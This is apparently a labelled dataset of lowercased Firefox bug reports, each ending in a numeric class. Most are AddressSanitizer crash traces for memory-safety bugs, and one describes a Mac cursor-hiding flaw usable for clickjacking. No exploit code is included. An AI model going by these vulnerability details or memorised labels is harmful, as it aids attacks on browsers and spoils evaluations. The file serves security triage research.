xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:4088 32 in xre_main toolkit/xre/nsapprunner.cpp:4300 33 in do_main browser/app/nsbrowserapp.cpp:282 34 in main browser/app/nsbrowserapp.cpp:643 35 in libc_start_main build/buildd/eglibc-2.15/csu/libc-start.c:226 36 in start is located 0 bytes to the right of global variable jsobject class from objdir-ff-asan/js/src/unified_cpp_js_src7.cpp of size 360 summary addresssanitizer global-buffer-overflow 0 shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 f9 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 contiguous container oob fc asan internal fe 359==aborting	11
cursor can be totally invisible using flash object and div user agent mozilla/5.0 macintosh intel mac os x 10.9 rv:28.0 gecko/20100101 firefox/28.0 beta/release build id 20140314220517 steps to reproduce firstly i would to say that it s not a flash issue and it s works only for firefox for mac os x do n't works on windows do n't works on google chrome do n't works on opera do n't works on safari when you go on a flash object that defined the cursor like unvisible and you go on a div with the cursor the cursor is totaly unvisible do n't works on windows do n't works on google chrome do n't works on opera do n't works on safari this can lead to clickjacking cursorjacking spoofing or others steps 1 go to the flash object in center into the flash object 2 wait 2 s 3 go with your cursor down div t2 4 cursor are cursor-jacked view this youtube video for more details actual results cursor are totaly unsibile when you try to install a xpi the cursor is totally unvisible expected results this can be used for clickjacking cursorjacking spoofing or others this issue works only on firefox for mac	9
assertion unexpected non-ascii character s2 file dist/include/nschartraits.h line 167 the attached certificate causes the following failure mozilla-central b735e618c2a8 0:03.18 21808 assertion unexpected non-ascii character s2 file dist/include/nschartraits.h line 167 0:03.18 hit moz_crash at memory/mozalloc/mozalloc_abort.cpp:30 0:03.18 asan sigsegv 0:03.18 0:03.18 21808==error addresssanitizer segv on unknown address pc sp bp t0 0:03.20 0 in mozalloc_abort char const memory/mozalloc/mozalloc_abort.cpp:30 0:04.74 1 in abort char const xpcom/base/nsdebugimpl.cpp:421 0:04.74 2 in ns_debugbreak xpcom/base/nsdebugimpl.cpp:408 0:04.74 3 in nschartraits char16_t copyascii char16_t char const unsigned long objdir-ff-asan64dbg/xpcom/string/src dist/include/nschartraits.h:167 0:04.74 4 in nsastring_internal assignascii char const unsigned int mozilla fallible_t const xpcom/string/src/nstsubstring.cpp:351 0:04.74 5 in nsastring_internal assignascii char const unsigned int xpcom/string/src/nstsubstring.cpp:332 0:04.74 6 in nsastring_internal assignascii char const objdir-ff-asan64dbg/security/manager/ssl/src dist/include/nstsubstring.h:380 0:04.74 7 in mozilla refptr nsix509cert operator nsix509cert const security/manager/ssl/src/transportsecurityinfo.cpp:795 0:04.74 8 in mozilla psm formatoverridablecerterrormessage nsisslstatus int nsxpidlcstring const int bool bool nsstring security/manager/ssl/src/transportsecurityinfo.cpp:1010 0:04.74 9 in mozilla psm transportsecurityinfo formaterrormessage mozilla baseautolock mozilla mutex const int mozilla psm sslerrormessagetype bool bool nsstring security/manager/ssl/src/transportsecurityinfo.cpp:249 0:04.74 10 in mozilla psm transportsecurityinfo geterrorlogmessage int mozilla psm sslerrormessagetype nsstring security/manager/ssl/src/transportsecurityinfo.cpp:209 0:04.74 11 in mozilla refptr mozilla psm transportsecurityinfo operator mozilla psm transportsecurityinfo const security/manager/ssl/src/sslservercertverification.cpp:223 0:04.74 12 in mozilla psm anonymous namespace certerrorrunnable checkcertoverrides security/manager/ssl/src/sslservercertverification.cpp:536 0:04.74 13 in mozilla psm anonymous namespace certerrorrunnable runontargetthread security/manager/ssl/src/sslservercertverification.cpp:548 0:04.74 14 in mozilla psm syncrunnablebase run security/manager/ssl/src/psmrunnable.cpp:35 0:04.74 15 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:699 0:04.75 16 in ns_invokebyindex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 0:04.75 17 in callmethodhelper invoke js/xpconnect/src/xpcwrappednative.cpp:2405 0:04.75 18 in callmethodhelper call js/xpconnect/src/xpcwrappednative.cpp:1746 0:04.75 19 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode js/xpconnect/src/xpcwrappednative.cpp:1713:12 0:04.75 20 in xpc_wn_callmethod jscontext unsigned int js value js/xpconnect/src/xpcwrappednativejsops.cpp:1285 0:04.75 21 0:04.75 0:04.75 addresssanitizer can not provide additional info 0:04.75 summary addresssanitizer segv memory/mozalloc/mozalloc_abort.cpp:30 mozalloc_abort char const marked s-s until investigated and confirmed to be harmless	5
asan heap-use-after-free in refreshdrivertimer tickdriver the attached testcase crashes the latest asan build crash was also confirmed on windows with the current release build the attached testcase requires ovaling_fast.svg takes about 20-30 seconds to trigger asan output attached in asan.txt	11
out-of-bounds read in mozilla dom oscillatornodeengine computecustom with negative frequency it s very similar to bug 995289 but the source of the bug is now a negative frequency not a high frequency i have missed this because i have ignored the crash signature for a while	11
assertion not a utf-8 string this code should only be used for converting from known utf-8 strings error file dist/include/nsutf8utils.h line 422 the attached certificate causes the following failure mozilla-central bf98b86fbea2 running test with pkix system js error null 0 uncaught exception 2147500037 11681 assertion not a utf-8 string this code should only be used for converting from known utf-8 strings error file dist/include/nsutf8utils.h line 422 11681 assertion not a utf-8 string this code should only be used for converting from known utf-8 strings error file dist/include/nsutf8utils.h line 422 hit moz_crash at memory/mozalloc/mozalloc_abort.cpp:30 asan sigsegv 11681==error addresssanitizer segv on unknown address pc sp bp t0 0 in mozalloc_abort char const memory/mozalloc/mozalloc_abort.cpp:30 1 in abort char const xpcom/base/nsdebugimpl.cpp:435 2 in ns_debugbreak xpcom/base/nsdebugimpl.cpp:422 3 in calculateutf8length write char const unsigned int objdir-ff-asan64dbg/xpcom/string/src dist/include/nsutf8utils.h:422 4 in nscharsinktraits calculateutf8length write calculateutf8length char const unsigned int objdir-ff-asan64dbg/xpcom/string/src dist/include/nschartraits.h:587 5 in calculateutf8length copy_string nsreadingiterator char calculateutf8length nsreadingiterator char const nsreadingiterator char const calculateutf8length objdir-ff-asan64dbg/xpcom/string/src dist/include/nsalgorithm.h:73 6 in appendutf8toutf16 nsacstring_internal const nsastring_internal mozilla fallible_t const xpcom/string/src/nsreadableutils.cpp:196 7 in appendutf8toutf16 nsacstring_internal const nsastring_internal xpcom/string/src/nsreadableutils.cpp:185 8 in appendutf8toutf16 char const nsastring_internal xpcom/string/src/nsreadableutils.cpp:243 9 in ns_convertutf8toutf16 objdir-ff-asan64dbg/security/manager/ssl/src dist/include/nsstring.h:158 10 in mozilla refptr nsix509cert operator nsix509cert const security/manager/ssl/src/transportsecurityinfo.cpp:795 11 in mozilla psm formatoverridablecerterrormessage nsisslstatus int nsxpidlcstring const int bool bool nsstring security/manager/ssl/src/transportsecurityinfo.cpp:1010 12 in mozilla psm transportsecurityinfo formaterrormessage mozilla baseautolock mozilla mutex const int mozilla psm sslerrormessagetype bool bool nsstring security/manager/ssl/src/transportsecurityinfo.cpp:249 13 in mozilla psm transportsecurityinfo geterrorlogmessage int mozilla psm sslerrormessagetype nsstring security/manager/ssl/src/transportsecurityinfo.cpp:209 14 in mozilla refptr mozilla psm transportsecurityinfo operator mozilla psm transportsecurityinfo const security/manager/ssl/src/sslservercertverification.cpp:223 15 in mozilla psm anonymous namespace certerrorrunnable checkcertoverrides security/manager/ssl/src/sslservercertverification.cpp:536 16 in mozilla psm anonymous namespace certerrorrunnable runontargetthread security/manager/ssl/src/sslservercertverification.cpp:548 17 in mozilla psm syncrunnablebase run security/manager/ssl/src/psmrunnable.cpp:35 when running without aborting i also hit this assertion afterwards assertion input was n't utf8 or incorrect length was calculated error file xpcom/string/src/nsreadableutils.cpp line 222 marked s-s until investigated and confirmed to be harmless	5
crash in fonttablerec when called by gfxmathtable apply the attached patch and run the mathml reftests the crash occurs sometime after the added reftest when the test specific fonts expire the crash is similar to that recorded in bug 961365 but it appears different stuff happens during the call to releasefonttable	11
heap-use-after-free in mozilla domsvglength gettearoff need fuzzpriv extension 6521==error addresssanitizer heap-use-after-free on address at pc bp sp read of size 8 at thread t0 0 in mozilla domsvglength gettearoff nssvglength2 nssvgelement bool objdir-ff-asan/content/svg/content/src dist/include/nsisupportsimpl.h:51 1 in nssvglength2 todomanimval mozilla domsvglength nssvgelement content/svg/content/src/nssvglength2.cpp:336 2 in mozilla dom svganimatedlength animval content/svg/content/src/svganimatedlength.cpp:37 3 in mozilla dom svganimatedlengthbinding get_animval jscontext js handle jsobject mozilla dom svganimatedlength jsjitgettercallargs objdir-ff-asan/dom/bindings/./svganimatedlengthbinding.cpp:48 4 in mozilla dom genericbindinggetter jscontext unsigned int js value dom/bindings/bindingutils.cpp:2280 5 in js invoke jscontext js callargs js maybeconstruct js/src/jscntxtinlines.h:239 6 in js invoke jscontext js value const js value const unsigned int js value const js mutablehandle js value js/src/vm/interpreter.cpp:531 7 in js invokegetterorsetter jscontext jsobject js value unsigned int js value js mutablehandle js value js/src/vm/interpreter.cpp:603 8 in js baseops getproperty jscontext js handle jsobject js handle jsobject js handle jsid js mutablehandle js value js/src/vm/shape-inl.h:46 9 in interpret jscontext js runstate js/src/jsobj.h:984 10 in js runscript jscontext js runstate js/src/vm/interpreter.cpp:422 11 in js invoke jscontext js callargs js maybeconstruct js/src/vm/interpreter.cpp:494 12 in js invoke jscontext js value const js value const unsigned int js value const js mutablehandle js value js/src/vm/interpreter.cpp:531 13 in js call jscontext js handle js value js handle js value js handlevaluearray const js mutablehandle js value js/src/jsapi.cpp:5214 14 in mozilla dom eventhandlernonnull call jscontext js handle js value mozilla dom event mozilla errorresult objdir-ff-asan/dom/bindings/./eventhandlerbinding.cpp:35 15 in js value mozilla dom eventhandlernonnull call nsisupports nsisupports const mozilla dom event mozilla errorresult mozilla dom callbackobject exceptionhandling objdir-ff-asan/dom/events dist/include/mozilla/dom/eventhandlerbinding.h:62 16 in mozilla jseventhandler handleevent nsidomevent dom/events/jseventhandler.cpp:214 17 in mozilla eventlistenermanager handleeventsubtype mozilla eventlistenermanager listener nsidomevent mozilla dom eventtarget dom/events/eventlistenermanager.cpp:950 18 in mozilla eventlistenermanager handleeventinternal nsprescontext mozilla widgetevent nsidomevent mozilla dom eventtarget nseventstatus dom/events/eventlistenermanager.cpp:1011 19 in mozilla eventtargetchainitem handleeventtargetchain nstarray mozilla eventtargetchainitem mozilla eventchainpostvisitor mozilla eventdispatchingcallback mozilla elmcreationdetector dom/events/eventdispatcher.cpp:287 20 in mozilla eventdispatcher dispatch nsisupports nsprescontext mozilla widgetevent nsidomevent nseventstatus mozilla eventdispatchingcallback nscomarray mozilla dom eventtarget dom/events/eventdispatcher.cpp:597 21 in nsdocumentviewer loadcomplete tag_nsresult layout/base/nsdocumentviewer.cpp:1004 22 in nsdocshell endpageload nsiwebprogress nsichannel tag_nsresult docshell/base/nsdocshell.cpp:6963 23 in nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult docshell/base/nsdocshell.cpp:6762 24 in non-virtual thunk to nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult docshell/base/nsdocshell.cpp:6769 25 in nsdocloader dofireonstatechange nsiwebprogress nsirequest int tag_nsresult uriloader/base/nsdocloader.cpp:1268 26 in nsdocloader dostopdocumentload nsirequest tag_nsresult uriloader/base/nsdocloader.cpp:850 27 in nsdocloader docloaderisempty bool uriloader/base/nsdocloader.cpp:740 28 in nsdocloader onstoprequest nsirequest nsisupports tag_nsresult uriloader/base/nsdocloader.cpp:624 29 in non-virtual thunk to nsdocloader onstoprequest nsirequest nsisupports tag_nsresult objdir-ff-asan/uriloader/base/unified_cpp_uriloader_base0.cpp:628 30 in nsloadgroup removerequest nsirequest nsisupports tag_nsresult netwerk/base/src/nsloadgroup.cpp:689 31 in nsdocument dounblockonload content/base/src/nsdocument.cpp:8706 32 in nsdocument unblockonload bool content/base/src/nsdocument.cpp:8634 33 in nsdocument dispatchcontentloadedevents content/base/src/nsdocument.cpp:4917 34 in nsrunnablemethodimpl void nsdocument void true run objdir-ff-asan/content/base/src dist/include/nsthreadutils.h:387 35 in nsthread processnextevent bool bool xpcom/threads/nsthread.cpp:766 36 in ns_processnextevent nsithread bool xpcom/glue/nsthreadutils.cpp:263 37 in mozilla ipc messagepump run base messagepump delegate ipc/glue/messagepump.cpp:95 38 in messageloop run ipc/chromium/src/base/message_loop.cc:229 39 in nsbaseappshell run widget/xpwidgets/nsbaseappshell.cpp:164 40 in nsappstartup run toolkit/components/startup/nsappstartup.cpp:278 41 in xremain xre_mainrun toolkit/xre/nsapprunner.cpp:4012 42 in xremain xre_main int char nsxreappdata const toolkit/xre/nsapprunner.cpp:4081 43 in xre_main toolkit/xre/nsapprunner.cpp:4293 44 in main browser/app/nsbrowserapp.cpp:282 45 in libc_start_main build/buildd/eglibc-2.17/csu/libc-start.c:260 is located 40 bytes inside of 80-byte region freed by thread t0 here 0 in interceptor_free asan_rtl 1 in snowwhitekiller snowwhitekiller xpcom/base/nscyclecollector.cpp:2611 2 in nscyclecollector freesnowwhite bool xpcom/base/nscyclecollector.cpp:2778 3 in nscyclecollector begincollection cctype nsicyclecollectorlistener xpcom/base/nscyclecollector.cpp:3705 4 in nscyclecollector collect cctype js slicebudget nsicyclecollectorlistener xpcom/base/nscyclecollector.cpp:3546 5 in nscyclecollector_collect nsicyclecollectorlistener xpcom/base/nscyclecollector.cpp:4127 6 in nsjscontext cyclecollectnow nsicyclecollectorlistener int dom/base/nsjsenvironment.cpp:1943 7 in nsjsenvironmentobserver observe nsisupports char const char16_t const dom/base/nsjsenvironment.cpp:283 8 in nsobserverservice notifyobservers nsisupports char const char16_t const xpcom/ds/nsobserverlist.cpp:96 9 in ns_invokebyindex xpcom/reflect/xptcall/src/md/unix/xptcinvoke_x86_64_unix.cpp:162 10 in xpcwrappednative callmethod xpccallcontext xpcwrappednative callmode js/xpconnect/src/xpcwrappednative.cpp:2395 11 in xpc_wn_callmethod jscontext unsigned int js value js/xpconnect/src/xpcwrappednativejsops.cpp:1273 12 in js invoke jscontext js callargs js maybeconstruct js/src/jscntxtinlines.h:239 13 in interpret jscontext js runstate js/src/vm/interpreter.cpp:2581 14 in js runscript jscontext js runstate js/src/vm/interpreter.cpp:422 15 in js invoke jscontext js callargs js maybeconstruct js/src/vm/interpreter.cpp:494 16 in js callorconstructboundfunction jscontext unsigned int js value js/src/jsfun.cpp:1401 17 in js invoke jscontext js callargs js maybeconstruct js/src/jscntxtinlines.h:239 18 in js invoke jscontext js value const js value const unsigned int js value const js mutablehandle js value js/src/vm/interpreter.cpp:531 19 in js crosscompartmentwrapper call jscontext js handle jsobject js callargs const js/src/jsproxy.cpp:448 20 in js proxy call jscontext js handle jsobject js callargs const js/src/jsproxy.cpp:2663 21 in js proxy_call jscontext unsigned int js value js/src/jsproxy.cpp:3066 22 in js invoke jscontext js callargs js maybeconstruct js/src/jscntxtinlines.h:239 23 in interpret jscontext js runstate js/src/vm/interpreter.cpp:2581 24 in js runscript jscontext js runstate js/src/vm/interpreter.cpp:422 25 in js invoke jscontext js callargs js maybeconstruct js/src/vm/interpreter.cpp:494 26 in js invoke jscontext js value const js value const unsigned int js value const js mutablehandle js value js/src/vm/interpreter.cpp:531 27 in js call jscontext js handle js value js handle js value js handlevaluearray const js mutablehandle js value js/src/jsapi.cpp:5214 28 in mozilla dom eventhandlernonnull call jscontext js handle js value mozilla dom event mozilla errorresult objdir-ff-asan/dom/bindings/./eventhandlerbinding.cpp:35 29 in js value mozilla dom eventhandlernonnull call nsisupports nsisupports const mozilla dom event mozilla errorresult mozilla dom callbackobject exceptionhandling objdir-ff-asan/dom/events dist/include/mozilla/dom/eventhandlerbinding.h:62 previously allocated by thread t0 here 0 in malloc asan_rtl 1 in moz_xmalloc memory/mozalloc/mozalloc.cpp:52 2 in mozilla domsvglength gettearoff nssvglength2 nssvgelement bool objdir-ff-asan/content/svg/content/src dist/include/mozilla/mozalloc.h:201 3 in nssvglength2 todomanimval mozilla domsvglength nssvgelement content/svg/content/src/nssvglength2.cpp:336 4 in mozilla dom svganimatedlength animval content/svg/content/src/svganimatedlength.cpp:37 5 in mozilla dom svganimatedlengthbinding get_animval jscontext js handle jsobject mozilla dom svganimatedlength jsjitgettercallargs objdir-ff-asan/dom/bindings/./svganimatedlengthbinding.cpp:48 6 in mozilla dom genericbindinggetter jscontext unsigned int js value dom/bindings/bindingutils.cpp:2280 7 in js invoke jscontext js callargs js maybeconstruct js/src/jscntxtinlines.h:239 8 in js invoke jscontext js value const js value const unsigned int js value const js mutablehandle js value js/src/vm/interpreter.cpp:531 9 in js invokegetterorsetter jscontext jsobject js value unsigned int js value js mutablehandle js value js/src/vm/interpreter.cpp:603 10 in js baseops getproperty jscontext js handle jsobject js handle jsobject js handle jsid js mutablehandle js value js/src/vm/shape-inl.h:46 11 in interpret jscontext js runstate js/src/jsobj.h:984 12 in js runscript jscontext js runstate js/src/vm/interpreter.cpp:422 13 in js invoke jscontext js callargs js maybeconstruct js/src/vm/interpreter.cpp:494 14 in js invoke jscontext js value const js value const unsigned int js value const js mutablehandle js value js/src/vm/interpreter.cpp:531 15 in js call jscontext js handle js value js handle js value js handlevaluearray const js mutablehandle js value js/src/jsapi.cpp:5214 16 in mozilla dom eventhandlernonnull call jscontext js handle js value mozilla dom event mozilla errorresult objdir-ff-asan/dom/bindings/./eventhandlerbinding.cpp:35 17 in js value mozilla dom eventhandlernonnull call nsisupports nsisupports const mozilla dom event mozilla errorresult mozilla dom callbackobject exceptionhandling objdir-ff-asan/dom/events dist/include/mozilla/dom/eventhandlerbinding.h:62 18 in mozilla jseventhandler handleevent nsidomevent dom/events/jseventhandler.cpp:214 19 in mozilla eventlistenermanager handleeventsubtype mozilla eventlistenermanager listener nsidomevent mozilla dom eventtarget dom/events/eventlistenermanager.cpp:950 20 in mozilla eventlistenermanager handleeventinternal nsprescontext mozilla widgetevent nsidomevent mozilla dom eventtarget nseventstatus dom/events/eventlistenermanager.cpp:1011 21 in mozilla eventtargetchainitem handleeventtargetchain nstarray mozilla eventtargetchainitem mozilla eventchainpostvisitor mozilla eventdispatchingcallback mozilla elmcreationdetector dom/events/eventdispatcher.cpp:287 22 in mozilla eventdispatcher dispatch nsisupports nsprescontext mozilla widgetevent nsidomevent nseventstatus mozilla eventdispatchingcallback nscomarray mozilla dom eventtarget dom/events/eventdispatcher.cpp:597 23 in nsdocumentviewer loadcomplete tag_nsresult layout/base/nsdocumentviewer.cpp:1004 24 in nsdocshell endpageload nsiwebprogress nsichannel tag_nsresult docshell/base/nsdocshell.cpp:6963 25 in nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult docshell/base/nsdocshell.cpp:6762 26 in non-virtual thunk to nsdocshell onstatechange nsiwebprogress nsirequest unsigned int tag_nsresult docshell/base/nsdocshell.cpp:6769 27 in nsdocloader dofireonstatechange nsiwebprogress nsirequest int tag_nsresult uriloader/base/nsdocloader.cpp:1268 28 in nsdocloader dostopdocumentload nsirequest tag_nsresult uriloader/base/nsdocloader.cpp:850 29 in nsdocloader docloaderisempty bool uriloader/base/nsdocloader.cpp:740 summary addresssanitizer heap-use-after-free 0 shadow bytes around the buggy address fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fd fd fd fd fd fd fd fd fd fd fa fa fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fd fd fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fd fd fa fa fa fa fd fd fd fd fd fd fd fd fd fd fa fa fa fa 00 00 00 00 00 00 00 00 00 fa fa fa fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fd fd fd fd fd fd fd fd fd fd fa fa fa fa 00 00 00 00 00 00 00 00 00 00 fa fa fa fa 00 00 00 00 shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 contiguous container oob fc asan internal fe 6521==aborting	11
heap-buffer-overflow in mozilla dom audiobuffersourcenodeengine copyfrominputbuffer tested on os ubuntu 12.04 firefox asan build from asan-report 6994==error addresssanitizer heap-buffer-overflow on address at pc bp sp read of size 17179677220 at thread t27 mediastreamgrph 0 in interceptor_memcpy asan_rtl 1 in mozilla dom audiobuffersourcenodeengine copyfrominputbuffer mozilla audiochunk unsigned int unsigned long unsigned int home/attekett/firefox/content/media/webaudio/audiobuffersourcenode.cpp:222 2 in mozilla dom audiobuffersourcenodeengine processblock mozilla audionodestream mozilla audiochunk const mozilla audiochunk bool home/attekett/firefox/content/media/webaudio/audiobuffersourcenode.cpp:470 3 in mozilla audionodestream processinput long long unsigned int home/attekett/firefox/content/media/audionodestream.cpp:468 4 in mozilla mediastreamgraphimpl producedataforstreamsblockbyblock unsigned int int long long home/attekett/firefox/content/media/mediastreamgraph.cpp:1192 5 in mozilla mediastreamgraphimpl runthread home/attekett/firefox/content/media/mediastreamgraph.cpp:1356 6 in mozilla anonymous namespace mediastreamgraphinitthreadrunnable run home/attekett/firefox/content/media/mediastreamgraph.cpp:1512 7 in nsthread processnextevent bool bool home/attekett/firefox/xpcom/threads/nsthread.cpp:766 8 in ns_processnextevent nsithread bool home/attekett/firefox/xpcom/glue/nsthreadutils.cpp:263 9 in mozilla ipc messagepumpfornonmainthreads run base messagepump delegate home/attekett/firefox/ipc/glue/messagepump.cpp:307 10 in messageloop runinternal home/attekett/firefox/ipc/chromium/src/base/message_loop.cc:229 11 in nsthread threadfunc void home/attekett/firefox/xpcom/threads/nsthread.cpp:346 12 in pt_root home/attekett/firefox/nsprpub/pr/src/pthreads/ptthread.c:212 13 in start_thread 0 14 in 0 is located 0 bytes to the right of 149152-byte region allocated by thread t0 here 0 in interceptor_calloc asan_rtl 1 in js_calloc unsigned long home/attekett/firefox/objdir-ff-asan/js/src dist/include/js/utility.h:104 2 in js arraybufferobject stealcontents jscontext js handle js arraybufferobject home/attekett/firefox/js/src/vm/arraybufferobject.cpp:750 3 in js_stealarraybuffercontents jscontext js handle jsobject home/attekett/firefox/js/src/vm/arraybufferobject.cpp:1124 4 in mozilla dom stealjsarraydataintothreadsharedfloatarraybufferlist jscontext nstarray jsobject const home/attekett/firefox/content/media/webaudio/audiobuffer.cpp:223 5 in mozilla dom audiobuffersourcenode sendbufferparametertostream jscontext home/attekett/firefox/content/media/webaudio/audiobuffersourcenode.cpp:633 6 in mozilla dom audiobuffersourcenode setbuffer jscontext mozilla dom audiobuffer home/attekett/firefox/objdir-ff-asan/dom/bindings dist/include/mozilla/dom/audiobuffersourcenode.h:56 7 in mozilla dom genericbindingsetter jscontext unsigned int js value home/attekett/firefox/dom/bindings/bindingutils.cpp:2316 8 in js calljsnative jscontext bool jscontext unsigned int js value js callargs const home/attekett/firefox/js/src/jscntxtinlines.h:239 9 in js invoke jscontext js value const js value const unsigned int js value const js mutablehandle js value home/attekett/firefox/js/src/vm/interpreter.cpp:511 10 in js invokegetterorsetter jscontext jsobject js value unsigned int js value js mutablehandle js value home/attekett/firefox/js/src/vm/interpreter.cpp:583 11 in js shape set jscontext js handle jsobject js handle jsobject bool js mutablehandle js value home/attekett/firefox/js/src/vm/shape-inl.h:95 12 in bool js baseops setpropertyhelper js executionmode 0 js executionmodetraits js executionmode 0 contexttype js handle jsobject js handle jsobject js handle jsid js baseops qualifiedbool js mutablehandle js value bool home/attekett/firefox/js/src/jsobj.cpp:5069 13 in setpropertyoperation jscontext js handle jsscript unsigned char js handle js value js handle js value home/attekett/firefox/js/src/vm/interpreter.cpp:314 14 in js runscript jscontext js runstate home/attekett/firefox/js/src/vm/interpreter.cpp:402 15 in js invoke jscontext js callargs js maybeconstruct home/attekett/firefox/js/src/vm/interpreter.cpp:474 16 in js invoke jscontext js value const js value const unsigned int js value const js mutablehandle js value home/attekett/firefox/js/src/vm/interpreter.cpp:511 17 in js call jscontext js handle js value js handle js value js handlevaluearray const js mutablehandle js value home/attekett/firefox/js/src/jsapi.cpp:5210 18 in mozilla dom function call jscontext js handle js value nstarray js value const mozilla errorresult home/attekett/firefox/objdir-ff-asan/dom/bindings/./functionbinding.cpp:34 19 in js value mozilla dom function call nscomptr nsisupports nscomptr nsisupports const nstarray js value const mozilla errorresult mozilla dom callbackobject exceptionhandling home/attekett/firefox/objdir-ff-asan/dom/base dist/include/mozilla/dom/functionbinding.h:58 20 in nsglobalwindow runtimeouthandler nstimeout nsiscriptcontext home/attekett/firefox/dom/base/nsglobalwindow.cpp:12106 21 in nsglobalwindow runtimeout nstimeout home/attekett/firefox/dom/base/nsglobalwindow.cpp:12330 22 in nsglobalwindow timercallback nsitimer void home/attekett/firefox/dom/base/nsglobalwindow.cpp:12576 23 in nstimerimpl fire home/attekett/firefox/xpcom/threads/nstimerimpl.cpp:609 24 in nstimerevent run home/attekett/firefox/xpcom/threads/nstimerimpl.cpp:702 25 in nsthread processnextevent bool bool home/attekett/firefox/xpcom/threads/nsthread.cpp:766 26 in ns_processnextevent nsithread bool home/attekett/firefox/xpcom/glue/nsthreadutils.cpp:263 27 in mozilla ipc messagepump run base messagepump delegate home/attekett/firefox/ipc/glue/messagepump.cpp:136 28 in messageloop runinternal home/attekett/firefox/ipc/chromium/src/base/message_loop.cc:229 29 in nsbaseappshell run home/attekett/firefox/widget/xpwidgets/nsbaseappshell.cpp:164 thread t27 mediastreamgrph created by t0 here 0 in interceptor_pthread_create asan_rtl 1 in pr_createthread home/attekett/firefox/nsprpub/pr/src/pthreads/ptthread.c:453 2 in pr_createthread home/attekett/firefox/nsprpub/pr/src/pthreads/ptthread.c:544 3 in nsthread init home/attekett/firefox/xpcom/threads/nsthread.cpp:423 4 in nsthreadmanager newthread unsigned int unsigned int nsithread home/attekett/firefox/xpcom/threads/nsthreadmanager.cpp:248 5 in ns_newthread nsithread nsirunnable unsigned int home/attekett/firefox/xpcom/glue/nsthreadutils.cpp:67 6 in tag_nsresult ns_newnamedthread 16ul char const 16ul nsithread nsirunnable unsigned int home/attekett/firefox/objdir-ff-asan/content/media dist/include/nsthreadutils.h:75 7 in mozilla anonymous namespace mediastreamgraphstablestaterunnable run home/attekett/firefox/content/media/mediastreamgraph.cpp:1580 8 in nscomptr_base assign_assuming_addref nsisupports home/attekett/firefox/objdir-ff-asan/widget/xpwidgets dist/include/nscomptr.h:486 9 in nsbaseappshell afterprocessnextevent nsithreadinternal unsigned int bool home/attekett/firefox/widget/xpwidgets/nsbaseappshell.h:93 10 in nsthread processnextevent bool bool home/attekett/firefox/xpcom/threads/nsthread.cpp:780 11 in ns_processnextevent nsithread bool home/attekett/firefox/xpcom/glue/nsthreadutils.cpp:263 12 in mozilla ipc messagepump run base messagepump delegate home/attekett/firefox/ipc/glue/messagepump.cpp:95 13 in messageloop runinternal home/attekett/firefox/ipc/chromium/src/base/message_loop.cc:229 14 in nsbaseappshell run home/attekett/firefox/widget/xpwidgets/nsbaseappshell.cpp:164 15 in nsappstartup run home/attekett/firefox/toolkit/components/startup/nsappstartup.cpp:278 16 in xremain xre_mainrun home/attekett/firefox/toolkit/xre/nsapprunner.cpp:4012 17 in xremain xre_main int char nsxreappdata const home/attekett/firefox/toolkit/xre/nsapprunner.cpp:4083 18 in xre_main home/attekett/firefox/toolkit/xre/nsapprunner.cpp:4297 19 in do_main int char nsifile home/attekett/firefox/browser/app/nsbrowserapp.cpp:282 20 in 0 summary addresssanitizer heap-buffer-overflow 0 shadow bytes around the buggy address 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa shadow byte legend one shadow byte represents 8 application bytes addressable 00 partially addressable 01 02 03 04 05 06 07 heap left redzone fa heap right redzone fb freed heap region fd stack left redzone f1 stack mid redzone f2 stack right redzone f3 stack partial redzone f4 stack after return f5 stack use after scope f8 global redzone f9 global init order f6 poisoned by user f7 contiguous container oob fc asan internal fe 6994==aborting	11
